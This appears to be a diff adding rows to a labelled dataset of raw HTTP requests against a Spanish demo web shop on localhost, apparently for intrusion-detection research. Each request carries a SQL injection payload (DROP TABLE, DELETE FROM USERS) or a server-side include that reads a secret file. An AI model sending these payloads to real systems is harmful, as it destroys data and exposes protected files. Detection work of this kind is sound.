+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+9463,"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=rizzardi&pwd=332G3le8a&remember=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&B1=Entrar HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+4729,"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&precio=85&cantidad=18&B1=A%F1adir+al+carrito HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+1968,"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&login=hua-yuan&pwd=*anoria&remember=off&B1=Entrar HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+19352,"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&login=chaar&pwd=pe4ibl171o&remember=on&B1=Entrar HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+16745,"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ohio&pwd=acerrador%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&remember=off&B1=Entrar HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+17727,"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&precio=100&cantidad=97&B1=A%F1adir+al+carrito HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+19937,"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=zaretsky&pwd=725l479zo&remember=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&B1=Entrar HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+12852,"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=alvarez&pwd=9ec828%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&remember=on&B1=Entrar HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+9272,"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&login=jeanes&pwd=d%F3712&remember=on&B1=Entrar HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+20972,"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&login=chaar&pwd=pe4ibl171o&remember=on&B1=Entrar HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+6584,"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=catlin&pwd=v76c088rA&remember=off%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&B1=Entrar HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+4911,"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&nombre=Vino+Rioja&precio=100&cantidad=2&B1=A%F1adir+al+carrito HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+7061,"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=21&B1=A%F1adir+al+carrito HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+11576,"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&B1=A%F1adir+al+carrito HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+8727,"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&precio=39&cantidad=15&B1=A%F1adir+al+carrito HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+11160,"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&B1=A%F1adir+al+carrito HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+11971,"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&B1=A%F1adir+al+carrito HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+19384,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&precio=3086&B1=Pasar+por+caja HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+11202,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&precio=6471&B1=Pasar+por+caja HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+16427,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&precio=6458&B1=Pasar+por+caja HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+1182,"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&precio=100&cantidad=43&B1=A%F1adir+al+carrito HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+2091,"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=39%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&cantidad=90&B1=A%F1adir+al+carrito HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+9679,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=715&B1=Pasar+por+caja%27+DELETE+FROM+USERS HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+13428,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%27+DELETE+FROM+USERS&precio=5781&B1=Pasar+por+caja HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+11541,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%27+DELETE+FROM+USERS&precio=4903&B1=Pasar+por+caja HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+10108,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%27+DELETE+FROM+USERS&precio=843&B1=Pasar+por+caja HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+1847,"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=74&B1=A%F1adir+al+carrito%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+1287,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3748&B1=Pasar+por+caja%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+22031,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5562%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&B1=Pasar+por+caja HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+7911,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7686&B1=Pasar+por+caja%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+7049,"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=97&B1=A%F1adir+al+carrito HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+2046,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+12347,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+3218,"GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=93&B1=A%F1adir+al+carrito%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+11176,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+24695,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+8091,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27+DELETE+FROM+USERS HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+4581,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27+DELETE+FROM+USERS HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+21443,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&B1=Pasar+por+caja HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+1468,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27+DELETE+FROM+USERS HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+17234,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27+DELETE+FROM+USERS HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+2938,"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27+DELETE+FROM+USERS HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+17336,"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=%27+DELETE+FROM+USERS&precio=5521&B1=Pasar+por+caja HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
+9344,"GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E HTTP/1.1\r\n
+Pragma: no-cache\r\n
+Cache-control: no-cache\r\n
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate\r\n
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5\r\n
+Accept-Language: en\r\n
+Host: localhost:8080\r\n
+Connection: close\r\n
+\r\n
+\r\n"
